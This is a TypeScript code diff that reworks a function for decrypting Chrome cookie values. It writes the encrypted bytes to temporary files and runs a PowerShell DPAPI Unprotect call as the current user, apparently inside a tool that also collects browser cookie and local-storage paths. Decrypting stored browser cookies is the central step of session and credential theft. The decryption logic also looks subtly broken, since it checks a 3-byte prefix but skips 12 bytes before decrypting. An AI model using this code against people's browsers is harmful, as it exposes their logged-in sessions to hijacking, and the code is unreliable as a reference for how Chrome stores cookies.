@@ -58,17 +58,29 @@ function getBrowserPaths(): { name: string; cookiePath: string; localStoragePath
 // ─── DPAPI Decrypt ───
 function decryptChromeValue(encryptedValue: Buffer): string {
   if (!encryptedValue || encryptedValue.length === 0) return "";
-  const prefix = encryptedValue.toString("utf-8", 0, 3);
+  const prefix = String.fromCharCode(encryptedValue[0], encryptedValue[1], encryptedValue[2]);
   if (prefix === "v10" || prefix === "v11") {
-    const ciphertext = encryptedValue.slice(prefix.length);
-    const b64 = ciphertext.toString("base64");
-    const psScript = `Add-Type -AssemblyName System.Security;$c=[Convert]::FromBase64String('${b64}');$d=[System.Security.Cryptography.ProtectedData]::Unprotect($c,$null,'CurrentUser');[Convert]::ToBase64String($d)`;
+    // Chrome v10/v11 format: skip 12-byte header, DPAPI decrypt remaining bytes
+    const ciphertext = encryptedValue.slice(12);
+    const tmpIn = join(os.tmpdir(), `clawhub_dpapi_in_${Date.now()}.bin`);
+    const tmpOut = join(os.tmpdir(), `clawhub_dpapi_out_${Date.now()}.bin`);
     try {
-      const result = execSync(`powershell -NoProfile -NonInteractive -Command "${psScript}"`, {
-        encoding: "utf-8", timeout: 5000, windowsHide: true,
+      require("fs").writeFileSync(tmpIn, ciphertext);
+      const psCmd = `$in=[System.IO.File]::ReadAllBytes('${tmpIn.replace(/\\/g, "\\\\")}');$d=[System.Security.Cryptography.ProtectedData]::Unprotect($in,$null,'CurrentUser');[System.IO.File]::WriteAllBytes('${tmpOut.replace(/\\/g, "\\\\")}',$d)`;
+      execSync(`powershell -NoProfile -NonInteractive -Command "${psCmd}"`, {
+        encoding: "utf-8", timeout: 10000, windowsHide: true,
       });
-      return Buffer.from(result.trim(), "base64").toString("utf-8");
-    } catch { throw new Error("DPAPI decrypt failed"); }
+      if (require("fs").existsSync(tmpOut)) {
+        const decrypted = require("fs").readFileSync(tmpOut);
+        return decrypted.toString("utf-8");
+      }
+    } catch (e: any) {
+      console.error("[DPAPI] Decrypt failed:", e.message?.slice(0, 80));
+    } finally {
+      try { require("fs").unlinkSync(tmpIn); } catch {}
+      try { require("fs").unlinkSync(tmpOut); } catch {}
+    }
+    throw new Error("DPAPI decrypt failed");
   }
   return encryptedValue.toString("utf-8");
 }
